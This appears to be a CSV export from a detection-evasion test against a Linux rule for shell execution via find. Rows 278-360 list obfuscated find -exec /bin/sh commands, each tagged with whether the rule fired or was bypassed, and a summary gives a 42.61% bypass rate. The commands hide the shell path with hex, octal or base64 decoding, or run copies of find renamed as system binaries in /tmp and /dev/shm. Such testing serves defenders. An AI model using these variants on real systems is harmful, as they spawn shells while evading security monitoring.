ID,Command,Log File,Result,All Detected Rules
278,"find . -exec $(perl -e '$_=""2f62696e2f7368"";s/(..)/print chr hex $1/ge') \; -quit",Shell_Execution_via_Find_attack278.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
279,"find . -exec $(echo ""0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68"" | xargs printf ""%b"") \; -quit",Shell_Execution_via_Find_attack279.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
280,find . -exec $(echo '/bin/sh' | tr -d '/' | sed 's/^/\/&/') \; -quit,Shell_Execution_via_Find_attack280.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
281,find . -exec $(echo -ne '\057\142\151\156\057\163\150') \; -quit,Shell_Execution_via_Find_attack281.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
282,"find . -exec $(bash -c 'echo -e ""\x2f\x62\x69\x6e\x2f\x73\x68""') \; -quit",Shell_Execution_via_Find_attack282.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
283,"find . -exec $(awk 'BEGIN{ORS="""";for(i=1;i<=7;i++)printf ""%c"",47+(i!=1)*((i==2)*51+(i==3)*57+(i==4)*63+(i==5)*48+(i==6)*68+(i==7)*57)}') \; -quit",Shell_Execution_via_Find_attack283.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
284,find . -exec $(cat <<< $(echo 2f62696e2f7368) | xxd -r -p) \; -quit,Shell_Execution_via_Find_attack284.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
285,"find . -exec $(bash -c ""$(echo 'ZWNobyAiL2Jpbi9zaCIK' | base64 -d)"") \; -quit",Shell_Execution_via_Find_attack285.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | Decode Base64 Encoded Text | File and Directory Discovery - Linux
286,find . -exec $(echo $(echo 2f62696e2f7368) | sed 's/../\\x&/g' | xargs printf) \; -quit,Shell_Execution_via_Find_attack286.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
287,"find . -exec $(perl -E 'say join """", map {chr hex} unpack ""(A2)*"", ""2f62696e2f7368""') \; -quit",Shell_Execution_via_Find_attack287.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
288,"find . -exec $(php -r 'echo ""\x2f\x62\x69\x6e\x2f\x73\x68"";') \; -quit",Shell_Execution_via_Find_attack288.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
289,"find . -exec $(lua -e 'io.write(""\x2f\x62\x69\x6e\x2f\x73\x68"")') \; -quit",Shell_Execution_via_Find_attack289.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
290,find . -exec $(bash -c 'echo 2f62696e2f7368 | xxd -r -p') \; -quit,Shell_Execution_via_Find_attack290.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
291,find . -exec $(printf '%s' '2f62696e2f7368' | xxd -r -p) \; -quit,Shell_Execution_via_Find_attack291.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
292,"find . -exec $(node -p ""Buffer.from('2f62696e2f7368', 'hex').toString()"") \; -quit",Shell_Execution_via_Find_attack292.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
293,"find . -exec $(perl -e 'print pack(""C*"",47,98,105,110,47,115,104)') \; -quit",Shell_Execution_via_Find_attack293.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
294,"find . -exec $(python3 -c 'import codecs;print(codecs.decode(""2f62696e2f7368"",""hex"").decode())') \; -quit",Shell_Execution_via_Find_attack294.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
295,"find . -exec $(bash -c 'echo ""\057\142\151\156\057\163\150""') \; -quit",Shell_Execution_via_Find_attack295.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
296,"find . -exec $(python3 -c 'import base64; print(base64.b64decode(""L2Jpbi9zaA=="").decode())') \; -quit",Shell_Execution_via_Find_attack296.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
297,find . -exec $(xxd -r -p <<< 2f62696e2f7368) \; -quit,Shell_Execution_via_Find_attack297.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
298,"find . -exec $(perl -e '$_=""2f62696e2f7368"";s/(..)/chr hex $1/ge;print') \; -quit",Shell_Execution_via_Find_attack298.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
299,"find . -exec $(awk 'BEGIN{printf ""%c%c%c%c%c%c%c"",47,98,105,110,47,115,104}') \; -quit",Shell_Execution_via_Find_attack299.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
300,"find . -exec $(bash -c ""$(echo ZmluZCAuIC1leGVjICQocHJpbnRmICcvYmluL3NoJykK | base64 -d)"") \; -quit",Shell_Execution_via_Find_attack300.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | Decode Base64 Encoded Text | File and Directory Discovery - Linux
301,cp /usr/bin/find /tmp/t; /tmp/t . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack301.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory | Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | File and Directory Discovery - Linux
302,cp $(which find) /tmp/x; /tmp/x . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack302.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
303,cp /usr/bin/find /dev/shm/f; /dev/shm/f . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack303.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
304,cp /bin/find /tmp/myapp; /tmp/myapp . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack304.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
305,cp /usr/bin/find /home/user/.find2; /home/user/.find2 . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack305.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
306,cp $(which find) /tmp/shellme; /tmp/shellme . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack306.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
307,cp /usr/bin/find /tmp/ls; /tmp/ls . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack307.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
308,cp /usr/bin/find /tmp/grep; /tmp/grep . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack308.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
309,cp /usr/bin/find /tmp/cron; /tmp/cron . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack309.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
310,cp /usr/bin/find /tmp/finder; /tmp/finder . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack310.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
311,cp /usr/bin/find /tmp/syscheck; /tmp/syscheck . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack311.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
312,cp /usr/bin/find /tmp/test; /tmp/test . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack312.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
313,cp /usr/bin/find /var/tmp/a; /var/tmp/a . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack313.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
314,cp /usr/bin/find /dev/shm/.tmpx; /dev/shm/.tmpx . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack314.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
315,cp /usr/bin/find /tmp/init; /tmp/init . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack315.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
316,cp /usr/bin/find /tmp/find2; /tmp/find2 . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack316.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
317,cp /usr/bin/find /tmp/findex; /tmp/findex . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack317.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
318,cp /usr/bin/find /tmp/.hidden; /tmp/.hidden . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack318.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
319,cp /usr/bin/find /tmp/startup; /tmp/startup . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack319.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
320,cp /usr/bin/find /tmp/myls; /tmp/myls . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack320.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
321,cp /usr/bin/find /tmp/.cache; /tmp/.cache . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack321.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
322,cp /usr/bin/find /tmp/dmidecode; /tmp/dmidecode . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack322.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | System Information Discovery | Execution Of Script Located In Potentially Suspicious Directory | Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder
323,cp /usr/bin/find /tmp/shiny; /tmp/shiny . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack323.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
324,cp /usr/bin/find /tmp/checker; /tmp/checker . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack324.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
325,cp /usr/bin/find /tmp/backup; /tmp/backup . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack325.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
326,cp /usr/bin/find /tmp/logrotate; /tmp/logrotate . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack326.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
327,cp /usr/bin/find /tmp/pinger; /tmp/pinger . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack327.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
328,cp /usr/bin/find /tmp/whoami; /tmp/whoami . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack328.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
329,cp /usr/bin/find /tmp/filelist; /tmp/filelist . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack329.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
330,cp /usr/bin/find /tmp/patcher; /tmp/patcher . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack330.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
331,cp /usr/bin/find /tmp/update; /tmp/update . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack331.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
332,cp /usr/bin/find /tmp/u; /tmp/u . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack332.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
333,cp /usr/bin/find /tmp/.svc; /tmp/.svc . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack333.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
334,cp /usr/bin/find /tmp/dbus; /tmp/dbus . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack334.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
335,cp /usr/bin/find /tmp/.bash_history; /tmp/.bash_history . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack335.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
336,cp /usr/bin/find /tmp/mgmt; /tmp/mgmt . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack336.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
337,cp /usr/bin/find /tmp/diag; /tmp/diag . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack337.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
338,cp /usr/bin/find /tmp/systemctl; /tmp/systemctl . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack338.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
339,cp /usr/bin/find /tmp/rand; /tmp/rand . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack339.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
340,cp /usr/bin/find /tmp/libtest; /tmp/libtest . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack340.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
341,cp /usr/bin/find /tmp/rc.local; /tmp/rc.local . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack341.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
342,cp /usr/bin/find /tmp/service; /tmp/service . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack342.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
343,cp /usr/bin/find /tmp/bootlog; /tmp/bootlog . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack343.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
344,cp /usr/bin/find /tmp/lsattr; /tmp/lsattr . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack344.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
345,cp /usr/bin/find /tmp/loadavg; /tmp/loadavg . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack345.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
346,cp /usr/bin/find /tmp/netcfg; /tmp/netcfg . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack346.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
347,cp /usr/bin/find /tmp/vuln; /tmp/vuln . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack347.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
348,cp /usr/bin/find /tmp/.kworker; /tmp/.kworker . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack348.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
349,cp /usr/bin/find /tmp/agent; /tmp/agent . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack349.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
350,cp /usr/bin/find /tmp/binutils; /tmp/binutils . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack350.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
351,cp /usr/bin/find /tmp/ioctl; /tmp/ioctl . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack351.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
352,cp /usr/bin/find /tmp/collector; /tmp/collector . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack352.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
353,cp /usr/bin/find /tmp/initctl; /tmp/initctl . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack353.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
354,cp /usr/bin/find /tmp/modprobe; /tmp/modprobe . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack354.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
355,cp /usr/bin/find /tmp/userd; /tmp/userd . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack355.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
356,cp /usr/bin/find /tmp/kmod; /tmp/kmod . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack356.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
357,cp /usr/bin/find /tmp/ifplugd; /tmp/ifplugd . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack357.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
358,cp /usr/bin/find /tmp/installer; /tmp/installer . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack358.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
359,cp /usr/bin/find /tmp/.uuidd; /tmp/.uuidd . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack359.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
360,cp /usr/bin/find /tmp/sysinfo; /tmp/sysinfo . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack360.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
,,,,
,,,,
=== SUMMARY REPORT ===,,,,
Calculation Base (Source: filtered_summary.txt),,,,
Total Meaningful Logs (Denominator),352,,,
Triggered Target (Detections),202,,,
Bypass Logs (Numerator),150,,,
BYPASS RATE (Bypass/Meaningful),150 / 352 (42.61%),,,
BYPASS RAIO (Bypass/Detections),0.74,,,
,,,,
--- DETAILS (From raw scan) ---,,,,
  > Bypass All (Raw),0,,,
  > Bypass Target Rule (Raw),199,,,
Missing/Not Run,8,,,
